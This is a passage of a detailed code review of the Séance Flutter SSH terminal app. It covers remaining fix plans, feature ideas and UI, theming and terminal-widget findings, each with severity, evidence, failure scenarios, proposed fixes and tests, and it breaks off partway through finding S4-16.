     - after swapping the stored master key, `runSync` throws a key-mismatch error before any push.
   - Then:
     - reorder to register/login → verify → `_rekeyVault` → token → settings;
     - add `AppSettings.syncKeyCheck` (HMAC of the vault key under a fixed label), written after
       enrolment and checked in `runSync`;
     - migrate by setting it after a round with at least one successful decrypt;
     - route `enrollSync` through a new `AppState.enrollSync` that uses `_mutate`.
3. **S3-05: lifecycle mapping** (about 80 lines).
   - Test first: a bootstrap widget test with `initOverride` sends `inactive`, expects
     `probe.isPaused == false`, then `hidden` → paused and `resumed` → resumed once. A counting fake
     managed store sees one `reconcileAll` per resume.
   - Then: the `switch` in `didChangeAppLifecycleState`, idempotent `setForeground`, and a single
     reconcile fanned out to retained copies and controllers.
4. **S3-06: exception-safe tab teardown** (about 100 lines).
   - Test first: a placeholder tab whose checkout parent is a symlink, so delete throws. `closeTab`
     should complete, `tabs` be empty, the engine be disposed and listeners notified.
   - Then: restructure `_disposeSession` into try/catch plus an always-run `finally`. `closeTab`
     applies the fallback, notify and keep-alive in `finally`, and returns a report of kept copies,
     which the terminal pane shows as a top toast.
5. **S3-07: quit guard** (about 150 lines).
   - Test first: a widget test marks an `EditorTab` dirty. `handleRequestAppExit()` then shows the
     dialog, and Cancel returns `cancel`. A clean state returns `exit` without a dialog.
   - Then: an `AppLifecycleListener(onExitRequested:)` in `_BootstrapState`, with the dialog on the
     root navigator (patterned on Poltergeist's `app_session_lifecycle.dart`).
6. **S3-04, small cut: Android backup and reset hardening** (about 120 lines).
   - Tests first:
     - `MasterKeyManager` over a fake storage: `probeKeystore(mayCreate: false)` with a null read
       writes nothing;
     - `AppServices.initialize` with a non-empty `vault.json` and an empty mock keystore: starts
       locked and does not mint;
     - a manifest parse test asserts `allowBackup="false"`.
   - Then: the manifest attributes plus `data_extraction_rules.xml`,
     `AndroidOptions(resetOnError: false)`, `FileVaultStore.hasEntries()`, the `mayCreate` plumbing,
     and a single-flight `unlockVaultFromKeystore`.

### 4. Ideas

1. **"Recovered edits" drawer.** One place for every managed checkout not attached to a live session:
   orphans (S3-12), sweep-inhibited directories (S3-01), and copies whose index entry is stale. Each
   row offers Open, Reveal, Export, "Upload to…" and Discard.
   *First slice:* a read-only list in Settings ▸ Files with Discard, backed by
   `ManagedRemoteFileStore.list()` minus open tabs.
2. **Account sigil.** Render `syncKeyCheck` (S3-02) as a short, stable glyph or word triple
   ("candle · raven · brass") in Settings ▸ Sync, so the user can check at a glance that two devices
   share the same vault key. A mismatch becomes visible before anything is pushed.
   *First slice:* show 4 words from a fixed 256-word list, derived from the check value.
3. **Draft ectoplasm (mobile draft autosave).** On `AppLifecycleState.paused`, write each dirty
   built-in-editor buffer to a `.draft` sidecar in the checkout directory, owner-only. On reopen, offer
   "Restore unsaved draft from 14:02?". This covers Android swipe-away, where there is no exit hook.
   *First slice:* write and restore for a single open editor, with a test driving the lifecycle.
4. **"Close the circle?" quit ritual.** Extend S3-07's dialog to list the live sessions and dirty
   files, with per-row actions (Save & upload, Discard, Keep session). Pair it with a
   "don't ask when only idle sessions are open" preference.
5. **Polite probing.** Back off exponentially per offline host (45 s → 90 s → … → 15 min), reset on
   any successful connect, and show "last checked 3 min ago" in the dot's tooltip. This cuts sshd log
   noise further on top of S3-05.
6. **Second-launch hand-off.** Once S3-09 adds the instance lock, the second process writes a
   "focus-me" request to a loopback port recorded in the lock file, and the first instance brings its
   window forward: the native single-instance behaviour users expect on Windows and Linux.

---

## S4 review: Séance Flutter UI, theming, and terminal widget integration

Reviewed `/home/user/Seance` at `dd7e105` (read-only). Scope: `app/seance_app/lib/ui/**`, `lib/theme/**`, `theme.dart`, `family_hues.dart`, and the terminal integration with `third_party/xterm` (paint, scroll, selection, resize and reflow).

Method:
- Read the code.
- Rendered real-font captures of the whole shell, dialogs and Settings with Flutter 3.47.2 (flutter_tester, DejaVu fonts). Sizes: 1440x900, 1024x700, 960x700, 959x700 and 1000x700 (desktop, light and dark); 360x800 and 320x640 (phone); text scales 1.0, 1.5 and 2.0.
- Wrote scratch widget tests that prove the behaviour behind four findings: the style identity change on each notification, the toggle reset, the reflow and cursor bugs, and the editor's layout cost per keystroke.

All scratch files are under `scratchpad/work-S4/`:
- captures: `caps/*.png`, `caps-sidebar/*.png`
- tests: `seance/app/seance_app/test/zz_s4_*` and `seance/third_party/xterm/test/zz/*`

Nothing in the repo was modified.

### 1. Summary

The UI code is careful and well-commented. The sidebar kit's keyboard model, the theme palette derivation, the grapheme-safe labels and the badge image pipeline are all good. Most visible defects are at the edges: narrow widths, large text, many tabs, custom accents. The biggest risks sit in a few structural spots:

1. **Privacy (P1).** The Assistant's "Include terminal output" opt-out is widget state. It silently turns back on every time the phone drawer reopens (verified with a test).
2. **Data loss (P1, partly known).** No app-exit observer is registered. ⌘Q or a window close throws away unsaved built-in-editor buffers and live sessions without asking.
3. **Performance (P2).** Every `AppState` notification (a tab switch, a probe sweep every 45 s, sync) gives every mounted terminal a new `TerminalStyle`. The xterm fork compares styles by identity, so each terminal re-measures its cells, clears its glyph paragraph cache and relays out (verified).
4. **Terminal correctness (P2).** In the fork, narrowing the terminal pushes the top of a half-filled screen into scrollback and leaves blank rows under the prompt. It can also leave the cursor one row off its prompt (both reproduced).
5. **Daily-use gaps.**
   - Tabs past the strip's width can't be reached with a plain mouse, and the active one can sit off-screen.
   - The tab strip and panel tabs overflow at large text sizes.
   - The terminal grid also follows the OS text scale: 22 columns on a phone at 2x.
   - ⌘T / "+" reopens a server with its stale connect-time config.
   - Custom accents are used as text colour with no contrast check.

Already on the backlog and confirmed still present: scrollback search, tab shortcuts, the command palette, quick connect, keeping the last output on disconnect, the three-stage layout, and keyboard-resizable panes.

### 2. Findings

| ID | Title | Sev | Category | NEW/KNOWN | Confidence |
|---|---|---|---|---|---|
| S4-01 | Every AppState notification flushes every terminal's glyph cache and relayouts it | P2 | performance | NEW | VERIFIED |
| S4-02 | Tab strip: active tab can be off-screen; overflowed tabs unreachable with a mouse | P2 | UX | NEW | VERIFIED (capture) / LIKELY (wheel) |
| S4-03 | Fixed-height tab strip (38 px) and utility tabs (52 px) overflow at large text scale | P2 | visual/layout, a11y | NEW | VERIFIED |
| S4-04 | "Include terminal output" opt-out resets to ON when the Assistant remounts | P1 | security/privacy | NEW | VERIFIED |
| S4-05 | Fork reflow on width shrink: top rows pushed to scrollback; cursor can land off its line | P2 | bug | NEW | VERIFIED |
| S4-06 | Built-in editor lays out the whole document a second time on every keystroke (gutter) | P2 | performance | NEW | VERIFIED (debug timing) |
| S4-07 | ⌘T / tab-strip "+" / macOS New Tab reconnect with the session's stale config | P2 | bug | NEW | VERIFIED |
| S4-08 | No quit guard: unsaved editor buffers and live sessions dropped on ⌘Q / window close | P1 | stability/data-safety | KNOWN (STATUS "Quitting stays the app's call"; ANALYSIS Files gate) | VERIFIED |
| S4-09 | Custom accent is used verbatim as `primary` text/icon colour with no contrast check | P2 | theming/a11y | NEW | VERIFIED |
| S4-10 | Settings > Assistant provider dropdown overflows by 28 px at 360 px | P3 | visual/layout | NEW | VERIFIED |
| S4-11 | 20 widgets use bare `fontFamily: 'monospace'`, incl. the TOFU fingerprint | P2 | cross-platform | NEW | LIKELY (repo's own comment) |
| S4-12 | Changed-host-key dialog: Trust button reachable while fingerprints are below the fold | P2 | security UX | NEW | VERIFIED (capture) |
| S4-13 | Dismissing the command generator mid-request still injects the command later | P2 | bug | KNOWN (SOL-038) | VERIFIED |
| S4-14 | macOS: closing the last focused terminal leaves native Edit routed to "terminal" | P2 | bug/cross-platform | KNOWN (SEA-008) | VERIFIED (trace) |
| S4-15 | Terminal grid also follows the OS text scale (22 columns on a 360 dp phone at 2x) | P2 | UX | NEW | VERIFIED (capture) |
| S4-16 | Global plain Ctrl+T binding: steals macOS text-field transpose; no Ctrl+Shift+T outside the terminal | P3 | UX/cross-platform | NEW | VERIFIED (binding) / LIKELY (transpose interplay) |
| S4-17 | Terminal tab chips expose neither selected state nor connection status to assistive tech | P2 | a11y | KNOWN (SOL-061 gate) | VERIFIED |
| S4-18 | Top toasts: no live-region announcement; action toasts auto-dismiss under the pointer | P3 | a11y | partly KNOWN (SOL-061 "live safety notices") | VERIFIED |
| S4-19 | Narrow-width chrome: update banner wraps per character at 200 px; tab labels truncate at min pane; phone title "S…" | P3 | visual/layout | NEW | VERIFIED (captures) |
| S4-20 | Selection paint walks every selected line per frame (select-all + streaming output) | P3 | performance | NEW | VERIFIED (trace) |
| S4-21 | Keyboard-interactive dialog: Enter doesn't submit or advance | P3 | UX | KNOWN (SOL-021) | VERIFIED |
| S4-22 | Server editor: no initial focus on a new server; Save/Test and test result scroll out of view | P3 | UX | NEW | VERIFIED (capture) |
| S4-23 | Built-in terminal palettes are no longer tuned to the (now slate) chrome; resize gutters form bands | P3 | theming/visual | NEW | VERIFIED (captures) |
| S4-24 | Link hover shows a hand cursor although a plain click doesn't open it | P3 | UX | NEW | VERIFIED |
| S4-25 | Git change letters coloured from `scheme.primary/tertiary` (the user accent), outside the FamilyHue vocabulary | P3 | theming | NEW | VERIFIED |
| S4-26 | Import-SSH-config dialog's TextEditingController is never disposed | P3 | stability | NEW | VERIFIED |
| S4-K | Still-present known gaps (search, tab shortcuts, last output, 960 px breakpoint, 380 px drawer, pane collapse) | — | missing-feature | KNOWN | VERIFIED |

---

#### S4-01: Every AppState notification flushes every terminal's glyph cache
- **Severity:** P2. **Category:** performance. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:**
  - `app/seance_app/lib/ui/terminal_appearance.dart:183-205`
  - `app/seance_app/lib/ui/terminal_pane.dart:62-64, 282-295, 1083-1104`
  - `third_party/xterm/lib/src/ui/terminal_text_style.dart:26` (no `==`)
  - `third_party/xterm/lib/src/ui/terminal_theme.dart` (no `==`)
  - `third_party/xterm/lib/src/ui/render.dart:97-112`
  - `third_party/xterm/lib/src/ui/painter.dart:31-54`
- **Evidence:**
  - `TerminalPane` rebuilds on every `AppState` notification. `_body` builds a `_SessionView` for **every tab of every server**. Each build calls `TerminalAppearance.resolve(...)`, which returns `TerminalStyle(fontSize:…, fontFamilyFallback: <new list>)`. With a theme that carries terminal colours it also returns a new `TerminalTheme` from `fromColors`.
  - `RenderTerminal.set textStyle` runs `if (value == _painter.textStyle) return;`. `TerminalStyle` doesn't override `==`, so the check fails. The painter then runs `_measureCharSize()` and `_paragraphCache.clear()`, and the render object calls `markNeedsLayout()`.
  - Scratch test `zz_s4_restyle_test.dart`: 3 mounted views, then `state.focusTab('t2')`, prints `identicalAfterTabSwitch=[false,false,false] equalByOperator=[false,false,false]`.
- **Failure scenario:** Ten open sessions, one running `htop`. Every tab switch, 45 s probe sweep, sync round or connect/disconnect clears all ten glyph caches. The terminal you switch to repaints every distinct glyph and colour combination from scratch. That undermines the IndexedStack's "instant switch" rationale in the `TerminalPane` doc comment and adds jank to colourful TUIs. This matters more because each cell is its own `Paragraph` (see Ideas).
- **Fix:**
  - (a) In the fork, give `TerminalStyle` value equality (`fontSize`, `height`, `fontFamily`, `listEquals(fontFamilyFallback)`) and `TerminalTheme` value equality (all colour fields plus `hashCode`). Record it in `PATCHES.md`.
  - (b) Belt and braces in the app: memoize `TerminalAppearance` in `_SessionViewState` keyed on (`terminalFontFamily`, `terminalFontSize`, `terminalPalette`, `themePalette.terminal`, brightness).
  - Tests:
    - Fork: after `pumpWidget`, re-pump `TerminalView` with an equal but new `TerminalStyle` and expect `renderTerminal.debugNeedsLayout == false`.
    - App: turn the scratch test into an assertion that the style is `==` across `focusTab`.
- **Effort:** S.

#### S4-02: The active tab can be off-screen; overflowed tabs can't be reached with a mouse
- **Severity:** P2. **Category:** UX. **Status:** NEW. **Confidence:** VERIFIED from the capture; the wheel behaviour is LIKELY.
- **Where:** `app/seance_app/lib/ui/terminal_pane.dart:367-441`. `SingleChildScrollView(scrollDirection: horizontal)` has no controller and no ensure-visible call; `grep ensureVisible` finds nothing.
- **Evidence:** In `caps/shell-many-tabs-1024.png` (12 tabs on one server, the last one active), the strip shows "Session 1, Session 2, long-running-job-0". No selected underline is visible and nothing hints that more tabs exist.
- **Failure scenario:**
  - A desktop user with a mouse wheel can't scroll the strip. Flutter maps a vertical wheel to a horizontal Scrollable only while Shift is held, and mouse drag isn't a desktop drag device.
  - There are no tab shortcuts (S4-K), and clicking the server row returns to the last-focused tab.
  - So tabs beyond the strip width, including the active one, are effectively unreachable, and you can't tell which tab you are typing into.
- **Fix:**
  - Give the strip a `ScrollController` and a `GlobalKey` per chip.
  - When `activeTabId` changes, call `Scrollable.ensureVisible(activeKey.currentContext!, alignmentPolicy: keepVisibleAtEnd/AtStart)` in a post-frame callback.
  - Wrap the strip in a `Listener(onPointerSignal:)` that turns a `PointerScrollEvent`'s `dy` into `jumpTo(offset + dy)`.
  - When `maxScrollExtent > 0`, show a trailing "⌄" (`MenuAnchor`) that lists all tabs with status dot, label and dirty mark.
  - Tests: 12 tabs at 1024 px with the last active; after pump, the active chip's rect lies inside the strip's rect. A `PointerScrollEvent(dy: 100)` over the strip increases the offset. The overflow button appears only when the tabs overflow.
- **Effort:** M.

#### S4-03: The tab strip and utility tabs don't grow with text scale
- **Severity:** P2. **Category:** visual/layout, a11y. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:**
  - `terminal_pane.dart:354-356` (strip `height: 38`) and `635` (`_ChipShell` `height: 38`)
  - `sidebar_panel.dart:168` (`_height = 52`) and `:191`
- **Evidence:**
  - `caps/shell-1440-ts2-dark.png` and `caps/phone-terminal-ts2.0.png`: the tab labels spill over the first terminal rows.
  - At text scale 2.0 the capture run logs `A RenderFlex overflowed by 1.00 pixels on the bottom … Column: sidebar_panel.dart:191:18` four times, and the debug overflow stripes are visible over the utility tabs.
- **Failure scenario:** An Android user at 200% font size (or iOS accessibility sizes) sees tab labels printed over their shell output, and the utility tabs show overflow bars in debug builds.
- **Fix:** Replace the fixed heights with `constraints: BoxConstraints(minHeight: 38)` sized from `MediaQuery.textScalerOf(context).scale(fontSize) * lineHeight + padding`. Alternatively, wrap chrome-only rows in `MediaQuery.withClampedTextScaling(maxScaleFactor: 1.6)`, which is what native tab bars do. Apply the same to `_PanelTabLabel`. Test: pump `TerminalTabStrip` and `SidebarPanel` under `TextScaler.linear(2.0)` with no FlutterError, and check the chip `RenderBox` height is at least the label's paragraph height.
- **Effort:** S.

#### S4-04: The "Include terminal output" opt-out resets to ON
- **Severity:** P1. **Category:** security/privacy. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:**
  - `app/seance_app/lib/ui/chat_sidebar.dart:23` (`bool _includeContext = true;` in widget state), `:69-71`, `:183-188`
  - `terminal_pane.dart:76-81`: the phone end-drawer; a closed Drawer's child is unmounted
  - `sidebar_panel.dart:102-104`
- **Evidence:** Scratch test `zz_s4_chat_toggle_test.dart`: open the drawer, untick the chip, close, reopen. It prints `AFTER REOPEN selected=true`. The transcript was deliberately moved to `AppState.chat` so it survives the drawer; the privacy toggle was left behind.
- **Failure scenario:** A user unticks the chip because the screen shows credentials or customer data, closes the drawer, and reopens it later. The next message quietly sends the last 200 terminal lines to the cloud provider. Redaction is best-effort. The same reset happens in the wide layout when the window crosses the 960 px breakpoint, or when `llmConfigured` flips.
- **Fix:**
  - Move the flag into `ChatSession`, next to the transcript; optionally persist it as a device setting.
  - Read it in `_send` from `state.chat.includeTerminalContext`.
  - Consider having the command generator's "Use recent terminal output" (`command_generator.dart:37`) default to the same preference.
  - Test: the scratch test as a regression, expecting `selected == false` after reopen; plus a unit test that `_send` passes `terminalContext: null` when the flag is off.
- **Effort:** S.

#### S4-05: Fork reflow pushes a half-filled screen into scrollback and can misplace the cursor
- **Severity:** P2. **Category:** bug. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:** `third_party/xterm/lib/src/core/buffer/buffer.dart:531-571` (`resize`).
- **Evidence:** Scratch tests `third_party/xterm/test/zz/resize_probe_test.dart` and `resize_probe2_test.dart`:
  - Seven lines at 80x24, then resize to 44x43: `lines=48 scrollBack=5 … first visible row: "2 file1" … blank rows visible below: 35`. Width-only shrink to 44x24 gives the same result, with `scrollBack=5`.
  - Prompt on row 3 with a 70-char line on row 23, then narrow to 40: `post: scrollBack=1 absCursor=3 text=""` while `row 2: "prompt$"`. The cursor sits one row below its prompt, because `_cursorY` is never adjusted for lines added by reflow.
  - The same effect shows in `caps/phone-terminal-ts1.0.png`: the first four output lines are gone although most of the screen is empty.
- **Failure scenario:**
  - Dragging the utility or list divider wider, snapping a window to half screen, or rotating a phone makes the top of your output "disappear" into scrollback while the bottom of the screen is empty.
  - With something drawn below the cursor on the main screen (`fzf --height`, zsh menu completion), the cursor lands on the wrong row after a narrow. Subsequent echo then draws on the wrong line until the program redraws.
- **Fix:** In the width branch:
  - Before reflow, record the cursor line, either as a `CellAnchor` on `lines[absoluteCursorY]` or by counting wrapped rows produced above the cursor.
  - After `reflow`, if `reflowResult.length > newHeight`, first drop trailing *blank* rows below the cursor's new row, down to `newHeight`. Only then let the rest become scrollback.
  - Set `_cursorY = newCursorAbs - scrollBack`.
  - Keep the maxLines trim behaviour from PATCHES.md.
  - Tests: turn both probes into expectations: `scrollBack == 0` and the first row is the original first line when the content fits; the cursor row text is `prompt$` after narrowing. Add a round trip (narrow then widen) that restores the original rows, and alt-buffer no-op checks.
- **Effort:** M. Core terminal code; ship behind the existing reflow tests plus these.

#### S4-06: The editor gutter lays out the whole document again on every keystroke
- **Severity:** P2. **Category:** performance. **Status:** NEW. **Confidence:** VERIFIED; timings are debug-mode only.
- **Where:** `app/seance_app/lib/ui/built_in_text_editor.dart:472-503` (`_ensureGutterLayout`), called from the `LayoutBuilder` at `:1244-1252`.
- **Evidence:**
  - The cache is keyed on text identity, so each keystroke builds a second `TextPainter` over the full span (up to `syntaxHighlightingMaxChars` = 200k) and calls `getOffsetForCaret` once per line.
  - Scratch `zz_s4_editor_perf_test.dart`, 150 KB and 2,074-line shell file, per simulated keystroke in flutter_tester (JIT): about 260-335 ms. Split: span 17-43 ms, layout 190-250 ms, carets 31-42 ms.
  - That comes on top of the TextField's own layout of the same text.
  - Release AOT will be faster, but the cost is still linear in file size and paid twice.
- **Failure scenario:** Typing into a 100-200 KB config or log file with syntax highlighting lags visibly, and each character arrives late.
- **Fix:**
  - Fast path: the editor font is monospace. If `maxLineChars * advanceWidth <= textWidth`, no line can wrap, so use `i * lineHeight`, which is exact. Compute `maxLineChars` from `_starts` as the maximum gap, and measure `advanceWidth` once per style/scaler.
  - Otherwise, reuse the field's own `RenderEditable` (`getLocalRectForCaret`) for visible lines only, or debounce precise layout to idle (about 150 ms), keeping the estimate meanwhile.
  - Test: add a `@visibleForTesting` counter of precise gutter layouts. Typing 20 characters into a no-wrap 150 KB document should do 0 precise layouts, and gutter tops should equal `i * lineHeight`. A document with a long wrapped line should still produce correct tops. The existing gutter tests must keep passing.
- **Effort:** S-M.

#### S4-07: New tab reconnects with the session's stale config
- **Severity:** P2. **Category:** bug. **Status:** NEW. **Confidence:** VERIFIED (code trace).
- **Where:**
  - `app/seance_app/lib/app_state.dart:1212-1227`: `newTab(config)` uses the argument verbatim.
  - Callers passing the session's connect-time snapshot: `ui/terminal_pane.dart:91` (strip "+"), `ui/terminal_pane.dart:1176` (⌘T / Ctrl+Shift+T in the terminal), `ui/app_menus.dart:76-79` (`openNewTab`, used by the macOS "New Tab" and the global Ctrl+T / ⌘T).
  - By contrast, `reconnect` deliberately uses `_configFor(old.serverId) ?? old.config` (`app_state.dart:1338`), and the doc comment at 1362-1365 states that intent.
- **Failure scenario:** You change web-01's port, user, auth method, key or ProxyJump while a session is open, then press ⌘T. The new tab dials the old endpoint or credentials. It fails, or worse, logs in as the old account. The strip meanwhile shows the new label.
- **Fix:** Resolve inside `newTab`: `final fresh = _configFor(config.id) ?? config;` and use `fresh` throughout. The call sites then need no change. Test: in `session_tabs_test.dart` style, open a fake session, `saveServer(config.copyWith(port: 2222))`, call `openNewTab(state)`, and expect `state.activeSession!.config.port == 2222`.
- **Effort:** S.

#### S4-08: No quit guard for unsaved editor buffers or live sessions
- **Severity:** P1. **Category:** stability/data-safety. **Status:** KNOWN. **Confidence:** VERIFIED.
- **Known where:** `docs/STATUS.md:288-295` says "Séance registers no exit observer today", and the ANALYSIS Files gate says "never erase unsaved edits implicitly".
- **Where:**
  - `grep didRequestAppExit|AppLifecycleListener` in `app/seance_app/lib` finds only the settings-window relay.
  - Editor saves happen only on ⌘S (`built_in_text_editor.dart:788`); there is no autosave.
  - The tab-close path does confirm (`terminal_pane.dart:115-197`).
- **Failure scenario:** A dirty built-in-editor buffer (not yet written to the checkout) plus ⌘Q, or closing the window on Linux/Windows where `FlView` asks Dart and gets `exit`, means the edits are gone. Live sessions with running jobs are also killed without a prompt.
- **Fix:**
  - In `_BootstrapState` (or `AdaptiveShell`), create an `AppLifecycleListener(onExitRequested: …)`.
  - If `state.tabs.whereType<EditorTab>().any((t) => t.dirty.value)` or any `TerminalSession.isConnected`, show a dialog ("Quit Séance? 2 files have unsaved changes; 3 sessions are connected") with Cancel / Quit, and return `AppExitResponse.cancel` or `exit`.
  - Poltergeist's `app_session_lifecycle.dart` / `QuitGuard` is the template, and the settings-window forwarding already routes exits to this isolate.
  - Test: set up a dirty `EditorTab`, call `tester.binding.handleRequestAppExit()`, tap Cancel, and expect `AppExitResponse.cancel`. With nothing dirty and no live sessions, expect `exit` with no dialog.
- **Effort:** M.

#### S4-09: A custom accent becomes `primary` verbatim, with no contrast check
- **Severity:** P2. **Category:** theming/a11y. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:**
  - `app/seance_app/lib/theme.dart:172-176`: `primary = tuned ? table.primary : palette.accent`
  - `:209`: only `onPrimary` is made legible
  - No contrast feedback in `ui/appearance_settings.dart:243-245`
- **Evidence:**
  - WCAG ratios of `primary` against the surface:
    - Dark surface `#232932`: indigo `#3949AB` 1.89:1, `#1565C0` 2.55:1.
    - Light surface `#FFFFFF`: yellow `#FFD600` 1.41:1, `#FFB300` 1.79:1.
    - Even the seed violet `#6B5BD2` picked by hand (one digit off, so not "tuned") is 2.82:1 on dark.
  - One accent is applied to both brightnesses, so most picks fail AA in one of them.
  - `primary` is the default colour for TextButton labels ("Cancel", "Clear filter", "View release"), the selected Settings tab label, focus borders and links.
- **Failure scenario:** A user picks their brand yellow or navy. Half the app's secondary actions become unreadable, focus rings disappear, and nothing tells them why.
- **Fix:**
  - Keep the raw accent for fills (`primaryContainer`, selection pill, tab underline).
  - Derive `primary` per brightness by stepping lightness (HCT tone via `material_color_utilities`, or the existing `_mix` toward black/white as `_selectionFor` does) until it reaches 4.5:1 against `n.surface`, falling back to the table primary.
  - Show a small "Low contrast, adjusted" note in Appearance > Colours when adjustment happens.
  - Test in `theme_build_test.dart`: for accents in {`#FFD600`, `#3949AB`, `#6B5BD3`} at both brightnesses, `contrastRatio(theme.colorScheme.primary, theme.colorScheme.surface) >= 4.5`. The default preset must stay byte-identical, and the existing preset-contrast tests must pass.
- **Effort:** S-M.

#### S4-10: The Assistant provider dropdown overflows at phone width
- **Severity:** P3. **Category:** visual/layout. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:** `app/seance_app/lib/ui/settings_screen.dart:273-297`. There is no `isExpanded`, while the model dropdown at `:345-346` has it.
- **Evidence:** The capture run at 360x800 logs `A RenderFlex overflowed by 28 pixels on the right … DropdownButtonFormField: settings_screen.dart:273:7`. The stripes are visible in `caps/settings-assistant-360.png`.
- **Fix:** Add `isExpanded: true` and `overflow: TextOverflow.ellipsis` on the item Texts. Test: pump `SettingsScreen(initialTab: assistant)` at 360 px, expect no exception, and select the second item.
- **Effort:** S.

#### S4-11: Bare `'monospace'` font family in 20 places, including the host-key fingerprint
- **Severity:** P2. **Category:** cross-platform. **Status:** NEW. **Confidence:** LIKELY. The repo documents the behaviour but I couldn't render on macOS here.
- **Where:**
  - `ui/host_key_dialog.dart:101` (fingerprint)
  - `ui/server_editor.dart:646,676` (key PEM)
  - `ui/connection_log_view.dart:92`
  - `ui/terminal_pane.dart:889` (status bar `user@host:port`)
  - `ui/git_pane.dart:566,718,726,777,933`
  - `ui/snippets_pane.dart:122,254,411`
  - `ui/chat_sidebar.dart:317`
  - `ui/files_pane.dart:1333`
  - `ui/server_list_pane.dart:799`
  - `ui/terminal_keyboard_bar.dart:103,121,130,147`
  - The repo's own `built_in_text_editor.dart:407-408` says a bare 'monospace' family "does not resolve on every platform (notably macOS/iOS)", which is why `SeanceTheme.monoFallback` exists.
- **Failure scenario:** On macOS/iOS the TOFU fingerprint `SHA256:…lI1O0…` renders in proportional SF, where I/l/1 and O/0 are hard to tell apart. That happens exactly when the user is asked to compare it character by character. Git paths and status-bar targets misalign too.
- **Fix:**
  - Add `SeanceTheme.mono({double? fontSize, Color? color, FontWeight? weight})`, returning `TextStyle(fontFamily: monoFallback.first, fontFamilyFallback: monoFallback, …)`, and replace all 20 uses.
  - Add a test that scans `lib/**.dart` for `fontFamily: 'monospace'` and fails, since the analyzer can't catch it.
  - Widget test: the host-key dialog's `SelectableText` style has `fontFamilyFallback` containing `'Menlo'`.
- **Effort:** S.

#### S4-12: The changed-host-key dialog shows Trust before the fingerprints
- **Severity:** P2. **Category:** security UX. **Status:** NEW. **Confidence:** VERIFIED (capture).
- **Where:** `app/seance_app/lib/ui/host_key_dialog.dart:23-80`.
- **Evidence:**
  - `caps/dialog-hostkey-changed-ts1.0.png` (360x640): the "Previously trusted" fingerprint is below the fold.
  - `caps/dialog-hostkey-changed-ts1.5.png`: neither fingerprint is visible, yet the large red filled "Trust the new key" is on screen and enabled.
  - Cancel, the safe action, is a small TextButton.
  - The algorithm change (ed25519 to ecdsa in the capture) isn't called out.
- **Failure scenario:** On a phone or with large text, the user can re-pin a changed key without ever seeing the new or old fingerprint. The dialog exists to force that comparison.
- **Fix:**
  - On the changed path, put both fingerprints *above* the explanatory paragraph, or make the paragraph collapsible.
  - Show "Key type changed: ecdsa → ed25519" when `pinned.type != presented.type`.
  - Enable "Trust the new key" only once the scroll view reaches its end (a `ScrollController` listener; enabled immediately if nothing scrolls).
  - Make Cancel a tonal button and give it initial focus so Enter/Esc cancel.
  - Test: at 360x640 and ts 1.5, the trust button's `onPressed` is null until `tester.drag(find.byType(SingleChildScrollView), Offset(0,-800))`, and non-null after. With no overflow it is enabled at once. Esc returns false.
- **Effort:** S-M.

#### S4-13: Dismissing the command generator doesn't cancel insertion
- **Severity:** P2. **Category:** bug. **Status:** KNOWN (SOL-038: "Cancel/dismiss must prevent later insertion; use mounted"). **Confidence:** VERIFIED.
- **Where:** `app/seance_app/lib/ui/command_generator.dart:60-116`. `injectInput` at `:106` has no `mounted` or cancel check; `setState` at `:91,110,112` has no `mounted` guard. The barrier and Esc still dismiss while busy, because only the Cancel button is disabled.
- **Failure scenario:** Esc during a slow request, then start typing `sudo systemctl …`. Seconds later the generated command is injected into the middle of what you typed, so pressing Enter runs a spliced command.
- **Fix:** Add `bool _closed` set in `dispose`. After each await, `if (_closed || !mounted) return;` before `injectInput`. Guard the `setState` calls. Optionally, while `_busy`, make Esc cancel explicitly with a PopScope. Test: fake provider behind a `Completer`; `sendKeyEvent(escape)`; complete; expect the engine received no input and no FlutterError.
- **Effort:** S.

#### S4-14: macOS Edit routing stuck on "terminal" after closing the last terminal
- **Severity:** P2. **Category:** bug/cross-platform. **Status:** KNOWN (SEA-008). **Confidence:** VERIFIED (trace).
- **Where:**
  - `ui/terminal_pane.dart:1050-1058`: `dispose` removes the focus listener before disposing the node, so `setTerminalFocused(false)` is never sent.
  - `macos/Runner/MainFlutterWindow.swift:288`: `routesEditToTerminal`.
  - `ui/app_menus.dart:144-153`: `activeSession == null` makes it a no-op.
- **Failure scenario:** Close the last tab while its terminal has focus. ⌘C/⌘V/⌘A in the server filter, the chat composer or the editor then silently do nothing, until another terminal gains focus.
- **Fix:** Keep a static `_SessionViewState? _reportedOwner`. On focus gain, set it and report true. On blur or dispose, report false only if `_reportedOwner == this`, then clear it. That stops an old view from clearing a newer one, which is the SEA-008 constraint. Test (`mac_menu_test.dart` style, mocked `seance/menu` channel): focus a terminal, close its tab, and expect the last call to be `setTerminalFocused(false)`. Focusing B and then disposing A must not send false.
- **Effort:** S.

#### S4-15: The terminal grid also follows the OS text scale
- **Severity:** P2. **Category:** UX. **Status:** NEW. **Confidence:** VERIFIED (capture).
- **Where:**
  - `ui/terminal_pane.dart:1096-1114` passes no `textScaler`, so the fork uses `MediaQuery.textScalerOf(context)` (`third_party/xterm/lib/src/terminal_view.dart:273`).
  - The app already has its own terminal font size and zoom (`terminal_appearance.dart:22-30`).
- **Evidence:** `caps/phone-terminal-ts2.0.png`: at 2x on a 360 dp phone the grid is about 22 columns, so `ls -la` lines wrap two or three times and TUIs (htop, vim status lines) break. Settings still says "13 pt" while cells render at 26.
- **Fix:** Pass `textScaler: TextScaler.noScaling`, making the terminal font size the single control. On first run, seed `terminalFontSize` from the OS scale, clamped. Alternatively add a setting "Scale terminal with system text size" (default off). Show the effective size in Settings. Test: pump `_SessionView` under `TextScaler.linear(2)` and expect `RenderTerminal.cellSize` to equal the 1.0 size.
- **Effort:** S.

#### S4-16: Global plain Ctrl+T, and no Ctrl+Shift+T outside the terminal
- **Severity:** P3. **Category:** UX/cross-platform. **Status:** NEW. **Confidence:** the binding is VERIFIED; the macOS transpose interplay is LIKELY (not run on macOS).
- **Where:** `ui/app_menus.dart:235-247` binds `SingleActivator(keyT, control: true)` on every platform. The terminal's own chord off Apple is Ctrl+Shift+T (`terminal_pane.dart:1153-1178`).
- **Failure scenario:**
  - On macOS, Ctrl+T in any text field (chat, filter, editor) is the Emacs transpose binding. AppMenus sits below `DefaultTextEditingShortcuts` in the bubble path, so it wins and opens a new SSH connection.
